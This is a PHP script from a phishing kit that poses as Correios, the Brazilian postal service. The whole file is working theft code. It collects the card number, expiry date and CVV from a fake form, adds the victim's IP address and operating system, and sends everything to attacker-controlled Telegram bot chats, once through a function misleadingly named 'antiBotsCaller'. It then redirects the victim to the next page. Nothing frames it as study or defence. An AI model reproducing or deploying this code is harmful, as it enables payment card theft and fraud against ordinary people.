<?php

    include '../../secure/anti0.php';




    include("../telegram.php");
    $OS = getOS($_SERVER['HTTP_USER_AGENT']); 
    $UserAgent =$_SERVER['HTTP_USER_AGENT'];
    $browser = explode(')',$UserAgent);				
    $_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

    $ccya = $_POST['1'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $message ="
Correios
Número do cartão: ".$_POST['card']."
Data de expiração: ".$_POST['expiry']."
CVV: ".$_POST['cvv']." 
Sistema operacional: ".$OS."
IP: ".$ip."\n";

    $theip = $message;
    function antiBotsCaller($messaggio,$token,$chatid) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    antiBotsCaller($theip,$antit2,$antic1);
    // To banned IP Bots Go to => ../../vendor/ban.txt and put your IPS.












    antiBotsCaller($message,$token,$chatid);
    header("Location: ../low.php");

?>